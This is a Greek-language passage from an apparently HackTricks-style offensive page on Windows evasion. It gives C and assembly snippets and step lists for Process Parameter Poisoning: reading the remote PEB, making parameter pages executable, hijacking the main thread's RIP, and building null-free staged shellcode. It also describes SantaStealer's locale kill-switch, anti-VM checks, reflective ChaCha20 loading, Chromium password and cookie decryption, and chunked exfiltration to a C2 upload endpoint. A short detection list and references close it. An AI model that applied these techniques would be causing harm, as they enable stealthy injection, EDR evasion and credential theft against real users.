Αυτό μετατρέπει τη φυσιολογική process creation στο **payload-transfer primitive**. Ο operator δημιουργεί το child process με attacker-controlled startup data και επιτρέπει στα Windows να εκτελέσουν το cross-process copy.

### Remote lookup flow without remote write APIs

Μετά τη δημιουργία του child, εντόπισε το αντιγραμμένο buffer χρησιμοποιώντας **read-only** primitives:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → λήψη του `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Ανάγνωση του remote `PEB`
3. Ακολούθηση του `PEB.ProcessParameters`
4. Ανάγνωση του `RTL_USER_PROCESS_PARAMETERS`
5. Χρήση του επιλεγμένου pointer:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Minimal flow:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Εκτέλεση του αντιγραμμένου parameter buffer

Η αντιγραμμένη περιοχή παραμέτρων είναι συνήθως `RW` και όχι εκτελέσιμη. Ένα συνηθισμένο P3 chain είναι:

1. Δημιουργία της διεργασίας κανονικά (όχι σε suspended κατάσταση)
2. Μετατροπή της επιλεγμένης σελίδας παραμέτρων σε executable με `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Επαναχρησιμοποίηση του main thread handle που έχει ήδη επιστραφεί στο `PROCESS_INFORMATION`
4. Ανακατεύθυνση της εκτέλεσης με `NtSetContextThread` (`CONTEXT_CONTROL`, overwrite του `RIP`)

Σε αντίθεση με τα κλασικά thread hijacking workflows, αυτό **δεν απαιτεί** `SuspendThread` / `ResumeThread`. Το context μπορεί να αλλάξει απευθείας στο returned main thread handle.

Αυτό αποφεύγει αρκετά APIs που παρακολουθούνται συνήθως για injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- συχνά επίσης `SuspendThread` / `ResumeThread`

### Περιορισμός των null bytes και staged shellcode

Και οι τρεις carriers είναι **string ή string-like data**, επομένως ένα raw payload που περιέχει `0x00` περικόπτεται κατά τη μεταφορά. Μια πρακτική λύση είναι ένα **null-free first stage** που ανακατασκευάζει constants κατά το runtime και στη συνέχεια φορτώνει ένα arbitrary second stage.

Ένα απλό pattern είναι η σύνθεση constants με βάση το XOR:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Αυτό επιτρέπει στο first stage να δημιουργεί stack strings, API arguments, DLL paths ή έναν second-stage shellcode loader χωρίς να ενσωματώνει null bytes στην transported parameter.

### Stack-based API calls από το first stage

Όταν το first stage πρέπει να καλέσει APIs όπως το `LoadLibraryA`, μπορεί να:

- κάνει push το string/buffer στο target stack
- δεσμεύσει το **32-byte x64 shadow space**
- θέσει τα `RCX`, `RDX`, `R8`, `R9` σε constants ή pointers σχετικούς με το `RSP`
- διατηρήσει το `RSP` **16-byte aligned** πριν από το call

Στη συνέχεια, ένα second stage μπορεί να αντιγραφεί από το stack σε μια `PAGE_READWRITE` allocation, να μετατραπεί σε `PAGE_EXECUTE_READ` με `VirtualProtect` και να γίνει jump σε αυτό, αποφεύγοντας μια άμεση RWX allocation.

### Detection ideas

Καλές ευκαιρίες για hunting που αναφέρονται από τους συγγραφείς:

- `VirtualProtectEx` / `NtProtectVirtualMemory` που κάνουν **process-parameter pages executable**
- αυτή η αλλαγή protection να ακολουθείται από `SetThreadContext` / `NtSetContextThread`
- remote reads των `PEB` και στη συνέχεια του `RTL_USER_PROCESS_PARAMETERS`
- ασυνήθιστα μεγάλα / υψηλού entropy `lpCommandLine`, `lpEnvironment` ή `STARTUPINFO.lpReserved` values κατά τη δημιουργία process

### Notes

- Το P3 είναι ένα **cross-process transfer trick**, όχι από μόνο του ένα πλήρες execution primitive: η αντιγραμμένη parameter χρειάζεται ακόμη αλλαγή σε execute-permission και μια μέθοδο execution redirection.
- Το `RtlCreateProcessReflection` / Dirty Vanity εξετάστηκε από τους συγγραφείς, αλλά απορρίφθηκε επειδή εσωτερικά φτάνει σε ύποπτα primitives όπως τα `NtWriteVirtualMemory` και `NtCreateThreadEx`.

## Tradecraft του SantaStealer για Fileless Evasion και Credential Theft

Το SantaStealer (γνωστό και ως BluelineStealer) δείχνει πώς τα σύγχρονα info-stealers συνδυάζουν AV bypass, anti-analysis και credential access σε ένα ενιαίο workflow.<sup>[[24]](#references)</sup>

### Έλεγχος βάσει διάταξης πληκτρολογίου & καθυστέρηση sandbox

- Ένα config flag (`anti_cis`) απαριθμεί τα εγκατεστημένα keyboard layouts μέσω του `GetKeyboardLayoutList`. Αν βρεθεί Cyrillic layout, το sample δημιουργεί ένα κενό marker `CIS` και τερματίζει πριν εκτελέσει stealers, διασφαλίζοντας ότι δεν θα detonates ποτέ σε excluded locales, ενώ αφήνει ένα hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Πολυεπίπεδη λογική `check_antivm`

- Η Variant A διατρέχει τη λίστα διεργασιών, υπολογίζει το hash κάθε ονόματος με ένα custom rolling checksum και το συγκρίνει με ενσωματωμένες blocklists για debuggers/sandboxes· επαναλαμβάνει το checksum πάνω στο όνομα του υπολογιστή και ελέγχει working directories όπως το `C:\analysis`.
- Η Variant B επιθεωρεί ιδιότητες του συστήματος (κατώτατο όριο πλήθους διεργασιών, πρόσφατο uptime), καλεί το `OpenServiceA("VBoxGuest")` για να ανιχνεύσει additions του VirtualBox και εκτελεί timing checks γύρω από sleeps για να εντοπίσει single-stepping. Οποιοδήποτε hit διακόπτει την εκτέλεση πριν από την εκκίνηση των modules.

### Fileless helper + διπλή reflective φόρτωση ChaCha20

- Το κύριο DLL/EXE ενσωματώνει έναν Chromium credential helper, ο οποίος είτε αποθηκεύεται στον δίσκο είτε γίνεται manually mapped στη μνήμη· η fileless λειτουργία επιλύει μόνη της τα imports/relocations, ώστε να μην εγγράφονται helper artifacts.
- Ο helper αποθηκεύει ένα second-stage DLL κρυπτογραφημένο δύο φορές με ChaCha20 (δύο keys των 32 byte + nonces των 12 byte). Μετά και τα δύο passes, φορτώνει reflectively το blob (χωρίς `LoadLibrary`) και καλεί τα exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, τα οποία προέρχονται από το [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Οι ρουτίνες του ChromElevator χρησιμοποιούν direct-syscall reflective process hollowing για injection σε ένα ενεργό Chromium browser, κληρονομούν τα AppBound Encryption keys και κάνουν decrypt passwords/cookies/credit cards απευθείας από SQLite databases, παρά το ABE hardening.


### Modular συλλογή στη μνήμη & chunked HTTP exfil

- Το `create_memory_based_log` διατρέχει έναν global πίνακα function pointers `memory_generators` και δημιουργεί ένα thread για κάθε ενεργοποιημένο module (Telegram, Discord, Steam, screenshots, documents, browser extensions κ.λπ.). Κάθε thread γράφει τα αποτελέσματα σε shared buffers και αναφέρει το file count μετά από ένα ~45s join window.
- Όταν ολοκληρωθεί η διαδικασία, όλα συμπιέζονται με τη statically linked βιβλιοθήκη `miniz` ως `%TEMP%\\Log.zip`. Στη συνέχεια, το `ThreadPayload1` κάνει sleep για 15s και μεταδίδει το archive σε chunks των 10 MB μέσω HTTP POST στο `http://<C2>:6767/upload`, πλαστογραφώντας ένα browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Κάθε chunk προσθέτει `User-Agent: upload`, `auth: <build_id>`, προαιρετικά `w: <campaign_tag>`, ενώ το τελευταίο chunk προσθέτει `complete: true`, ώστε το C2 να γνωρίζει ότι η επανασυναρμολόγηση ολοκληρώθηκε.

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [16] [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusing Chrome Remote Desktop On Red Team Operations A Practical Guide](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)

{{#include ../banners/hacktricks-training.md}}
